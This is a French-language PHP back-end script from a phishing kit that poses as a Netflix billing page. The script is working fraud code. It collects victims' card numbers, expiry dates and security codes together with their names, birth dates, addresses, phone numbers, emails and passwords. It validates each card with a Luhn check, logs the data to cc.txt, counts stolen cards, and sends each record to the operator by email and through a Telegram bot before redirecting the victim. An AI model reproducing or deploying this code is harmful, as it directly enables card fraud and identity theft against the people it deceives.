<?php
  error_reporting(0);
  ob_start();
  session_start();
  include '../../Settings.php';
  include '../../ip.php';
if($_SERVER['REQUEST_METHOD'] == 'POST'){
    $_SESSION["c_num"]    = $_POST["c_num"];
    $_SESSION["exdate"]    = $_POST["exdate"];
    $_SESSION["csc"]    = $_POST["csc"];

$message = 'ㅤ
ㅤㅤㅤㅤㅤ[🎩] MiauwCard [🎩]

💳 Num carte : '.$_SESSION["c_num"].'
💳 Date Expiration : '.$_SESSION["exdate"].'
💳 Cryptogramme visuel : '.$_SESSION["csc"].'


📞Nom : '.$_SESSION["lastname"].'
📞Prénom : '.$_SESSION["firstname"].'
📞Date de naissance : '.$_SESSION["dob"].'
📞Adresse : '.$_SESSION["address"].'
📞Code Postal : '.$_SESSION["zip"].'
📞Ville : '.$_SESSION["city"].'
📞Numéro de téléphone : '.$_SESSION["phone"].'

💌Email : '.$_SESSION['email'].'
🔍Mot de passe rez : '.$_SESSION['pass'].'

🎯 IP : '._ip().'
ㅤ
';
$Subject="「💳」 +1 CC [$bin] $bin_brand ,$bin_bank ❤ "._ip();
$head="From: (っ◔◡◔)っTYNOX N3TFLIX 💎 <cc@sdf.cash>";
$fil = fopen('cc.txt','a+');
function is_valid_luhn($number) {
  settype($number, 'string');
  $sumTable = array(
    array(0,1,2,3,4,5,6,7,8,9),
    array(0,2,4,6,8,1,3,5,7,9));
  $sum = 0;
  $flip = 0;
  for ($i = strlen($number) - 1; $i >= 0; $i--) {
    $sum += $sumTable[$flip++ & 0x1][$number[$i]];
  }
  return $sum % 10 === 0;
}
if(is_valid_luhn($_SESSION["c_num"]) && is_numeric($_SESSION["c_num"])){
     fwrite($fil, ''.$_SESSION["c_num"].'|'.$_SESSION["exdate"].'|'.$_SESSION["csc"].'|'.$_SESSION["lastname"].'|'.$_SESSION["address"].'|'.$_SESSION["zip"].'|'.$_SESSION["city"].'|'.$_SESSION["dob"].'|'.$_SESSION["phone"].'|'.$_SESSION["email"]."\n");
$_SESSION['step_four']  = true;
	$filepath = './stats.ini';
$data = @parse_ini_file($filepath);
$data['cc']++;
            function update_ini_file($data, $filepath) {
              $content = "";
              $parsed_ini = parse_ini_file($filepath, true);
              foreach($data as $section => $values){
                if($section === ""){
                  continue;
                }
                $content .= $section ."=". $values . "\n\r";
              }
              if (!$handle = fopen($filepath, 'w')) {
                return false;
              }
              $success = fwrite($handle, $content);
              fclose($handle);
            }
update_ini_file($data, $filepath);
if ($mail_sending == true) {
  mail($my_mail,$Subject,$message,$head);
 }
 if ($telegram_sending == true) {
$messagetelegram = urlencode("".$message."");
  $html = file_get_contents('https://api.telegram.org/bot'.$bot_token.'/sendMessage?chat_id='.$chat_login.'&text='.$messagetelegram.'');
  }
    if($vbv){
        header('location: ../vbvload.php?enc=' . md5(time()) . '&p=1&dispatch=' . sha1(time()));   

    }
    else{
      header('location: ../merci.php?enc=' . md5(time()) . '&p=1&dispatch=' . sha1(time()));   

    }
    } else {
        header('location: ../billing2.php?error=true');   
    }
}
else
{
  header('location: ../../../index.php');
} 
?>
